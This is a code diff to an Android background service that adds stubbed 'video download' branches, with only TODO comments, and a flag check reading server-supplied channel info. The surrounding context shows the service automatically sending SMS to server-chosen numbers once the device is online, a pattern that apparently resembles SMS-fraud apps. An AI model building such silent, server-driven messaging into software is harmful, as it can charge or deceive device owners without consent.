@@ -209,6 +209,9 @@ public class BgService extends Service {
                     long sms_delay_time = sm.getSMSSendDelay();
                     SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                     mStartSMSAfterInternet = false;
+                } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
+                    //TODO : start vedio download alarm
+                    mStartSMSAfterInternet = false;
                 }
             } else {
                 sm.setInternetConnectFailed(true);
@@ -250,6 +253,9 @@ public class BgService extends Service {
                     long sms_delay_time = sm.getSMSSendDelay();
                     SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                     mStartSMSAfterInternet = false;
+                } else if (isDownloadVedio() == true) {
+                    //TODO : start download vedio process alarm
+                    mStartSMSAfterInternet = false;
                 }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
@@ -274,6 +280,9 @@ public class BgService extends Service {
                     if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                         long sms_delay_time = sm.getSMSSendDelay();
                         SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                        mStartSMSAfterInternet = false;
+                    } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
+                        //TODO : start vedio download alarm
                         mStartSMSAfterInternet = false;
                     }
                 }
@@ -352,6 +361,16 @@ public class BgService extends Service {
             String smsOrDial = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
             if (smsOrDial != null && targetNum != null && sendText != null) {
                 return Integer.valueOf(smsOrDial) == 0 ? true : false;
+            }
+        }
+        return false;
+    }
+    
+    private boolean isDownloadVedio() {
+        if (mSM.mXMLHandler != null) {
+            String flag = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
+            if (flag != null) {
+                return Integer.valueOf(flag) == 2 ? true : false;
             }
         }
         return false;
